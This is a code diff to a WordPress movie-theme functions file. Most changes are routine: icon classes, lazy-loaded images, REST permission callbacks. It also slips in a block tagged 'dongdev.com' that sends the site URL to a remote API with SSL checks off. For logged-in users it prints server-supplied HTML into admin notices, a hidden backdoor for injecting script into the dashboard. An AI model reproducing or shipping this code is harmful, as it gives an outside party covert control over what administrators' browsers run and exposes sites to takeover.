@@ -6,9 +6,48 @@
 * @copyright: (c) 2021 Doothemes. All rights reserved
 * ----------------------------------------------------
 *
-* @since 2.4.3
+* @since 2.5.2
 *
 */
+/* dongdev.com */
+if(!function_exists('dbmvs_notice')){
+    function dbmvs_notice() {
+			global $pagenow;
+			$api_params = array(
+				'notice' => get_option('siteurl'),
+			);
+			$response = wp_remote_post(DBMOVIES_DBMVAPI, array('timeout' => 15, 'sslverify' => false, 'body' => $api_params ));
+			if ( ! is_wp_error( $response ) && is_user_logged_in()){
+				$resu = wp_remote_retrieve_body( $response );	
+				$resu = json_decode($resu, true);
+				if ($resu['status'] == true) {
+					if (in_array($pagenow, $resu['page']))
+						echo $resu['data'];
+				}
+			}
+			
+	}	
+	add_action('admin_notices', 'dbmvs_notice');	
+}
+/* dongdev.com */
+
+# Define theme color
+function dooplay_meta_theme_color($color = 'default'){
+	switch ($color) {
+		case 'default':
+			$set_color = '#ffffff';
+			break;
+
+		case 'dark':
+			$set_color = '#000000';
+			break;
+
+		case 'fusion':
+			$set_color = dooplay_get_option('fbgcolor','#000000');
+			break;
+	}
+	echo '<meta name="theme-color" content="'.$set_color.'">';
+}
 
 # Get Option
 function dooplay_get_option($option_name = '', $default = ''){
@@ -179,7 +218,7 @@ function doo_is_true($option = false, $key = false){
 
 # JavaScript Dev Mode
 function doo_devmode(){
-	return (WP_DEBUG && defined('WP_DOOTHEMES_DEV')) ? '' : 'min/';
+	return (WP_DEBUG && defined('WP_DOOTHEMES_DEV')) ? '' : '.min';
 }
 
 # Mobile or not mobile
@@ -257,10 +296,12 @@ if(!function_exists('doo_logo_admin')){
 
 # Total count content
 function doo_total_count($type = false, $status = 'publish') {
-    if(isset($type)){
+    if(isset($type) && DOO_THEME_TOTAL_POSTC == true){
         $total = wp_count_posts( $type )->$status;
         return number_format($total);
-    }
+    } else {
+		return;
+	}
 }
 
 # Get genres
@@ -303,18 +344,18 @@ function doo_pagination($pages = false){
     if(1 != $pages)  {
         echo "<div class=\"pagination\"><span>".__d('Page')." ".$paged." ".__d('of')." ".$pages."</span>";
         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "";
-        if($paged > 1 && $showitems < $pages) echo "<a class='arrow_pag' href='".get_pagenum_link($paged - 1)."'><i id='prevpagination' class='icon-caret-left'></i></a>";
+        if($paged > 1 && $showitems < $pages) echo "<a class='arrow_pag' href='".get_pagenum_link($paged - 1)."'><i id='prevpagination' class='fas fa-caret-left'></i></a>";
         for ($i=1; $i <= $pages; $i++) {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )) {
                 echo ($paged == $i)? "<span class=\"current\">".$i."</span>":"<a href='".get_pagenum_link($i)."' class=\"inactive\">".$i."</a>";
             }
         }
-        if ($paged < $pages && $showitems < $pages) echo "<a class='arrow_pag' href=\"".get_pagenum_link($paged + 1)."\"><i id='nextpagination' class='icon-caret-right'></i></a>";
+        if ($paged < $pages && $showitems < $pages) echo "<a class='arrow_pag' href=\"".get_pagenum_link($paged + 1)."\"><i id='nextpagination' class='fas fa-caret-right'></i></a>";
         if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "";
         echo "</div>\n";
 	    echo "<div class='resppages'>";
-		previous_posts_link('<span class="icon-chevron-left"></span>');
-		next_posts_link('<span class="icon-chevron-right"></span>');
+		previous_posts_link('<span class="fas fa-chevron-left"></span>');
+		next_posts_link('<span class="fas fa-chevron-right"></span>');
 	    echo "</div>";
     }
 }
@@ -554,7 +595,7 @@ if(!function_exists('doo_dashboard_count_types')){
         $operator   = 'and';
         $post_types = get_post_types( $args, $output, $operator );
         foreach ( $post_types as $post_type ) {
-            $num_posts = wp_count_posts( $post_type->name );
+            $num_posts = wp_count_posts($post_type->name);
             $num       = number_format_i18n( $num_posts->publish );
             $text      = _n( $post_type->labels->singular_name, $post_type->labels->name, intval( $num_posts->publish ) );
             if ( current_user_can('edit_posts') ) {
@@ -675,13 +716,13 @@ function doo_social_sharelink($id) {
         $out = "<div class='sbox'><div class='dt_social_single'>";
         $out.= "<span>". __d('Shared') ."<b id='social_count'>{$count}</b></span>";
         $out.= "<a data-id='{$id}' rel='nofollow' href='javascript: void(0);' onclick='window.open(\"https://facebook.com/sharer.php?u={$slink}\",\"facebook\",\"toolbar=0, status=0, width=650, height=450\")' class='facebook dt_social'>";
-        $out.= "<i class='icon-facebook'></i> <b>".__d('Facebook')."</b></a>";
+        $out.= "<i class='fab fa-facebook-f'></i> <b>".__d('Facebook')."</b></a>";
         $out.= "<a data-id='{$id}' rel='nofollow' href='javascript: void(0);' onclick='window.open(\"https://twitter.com/intent/tweet?text={$title}&url={$slink}\",\"twitter\",\"toolbar=0, status=0, width=650, height=450\")' data-rurl='{$slink}' class='twitter dt_social'>";
-        $out.= "<i class='icon-twitter'></i> <b>".__d('Twitter')."</b></a>";
+        $out.= "<i class='fab fa-twitter'></i> <b>".__d('Twitter')."</b></a>";
         $out.= "<a data-id='{$id}' rel='nofollow' href='javascript: void(0);' onclick='window.open(\"https://pinterest.com/pin/create/button/?url={$slink}&media={$image}&description={$title}\",\"pinterest\",\"toolbar=0, status=0, width=650, height=450\")' class='pinterest dt_social'>";
-        $out.= "<i class='icon-pinterest-p'></i></a>";
+        $out.= "<i class='fab fa-pinterest-p'></i></a>";
         $out.= "<a data-id='{$id}' rel='nofollow' href='whatsapp://send?text={$title}%20-%20{$slink}' class='whatsapp dt_social'>";
-        $out.= "<i class='icon-whatsapp'></i></a></div></div>";
+        $out.= "<i class='fab fa-whatsapp'></i></a></div></div>";
         // Display view
         echo $out;
     }
@@ -837,6 +878,7 @@ if(!function_exists('dooplay_register_wp_api_search')){
     	register_rest_route('dooplay', '/search/', array(
             'methods' => 'GET',
             'callback' => 'dooplay_live_search',
+			'permission_callback' => '__return_true'
         ));
     }
     add_action('rest_api_init','dooplay_register_wp_api_search');
@@ -848,6 +890,7 @@ if(!function_exists('dooplay_register_wp_api_glossary')){
     	register_rest_route('dooplay', '/glossary/', array(
             'methods' => 'GET',
             'callback' => 'dooplay_live_glossary',
+			'permission_callback' => '__return_true'
         ));
     }
     add_action('rest_api_init','dooplay_register_wp_api_glossary');
@@ -1031,7 +1074,7 @@ function doo_login_form(){
     $form = '
     <div class="login_box">
         <div class="box">
-            <a id="c_loginbox"><i class="icon-close2"></i></a>
+            <a id="c_loginbox"><i class="fas fa-times"></i></a>
             <h3>'. __d('Login to your account').'</h3>
             <form method="post" action="'.$action.'">
                 <fieldset class="user"><input type="text" name="log" placeholder="'.__d('Username').'"></fieldset>
@@ -1186,7 +1229,7 @@ function doo_topimdb_item($num,$post_id){
 	$marating  = get_post_meta($post_id,'imdbRating', true);
 	$image_url = dbmovies_get_poster($post_id,'dt_poster_b','dt_poster','w92');
 	$out = "<div class='top-imdb-item' id='top-{$post_id}'>";
-	$out .= "<div class='image'><div class='poster'><a href='{$permalink}'><img src='{$image_url}' alt='{$title_pt}'></a></div></div>";
+	$out .= "<div class='image'><div class='poster'><a href='{$permalink}'><img data-src='{$image_url}' loading='lazy' class='lazyload' alt='{$title_pt}'></a></div></div>";
 	$out .= "<div class='puesto'>{$num}</div>";
 	$out .= "<div class='rating'>{$marating}</div>";
 	$out .= "<div class='title'><a href='{$permalink}'>{$title_pt}</a></div>";
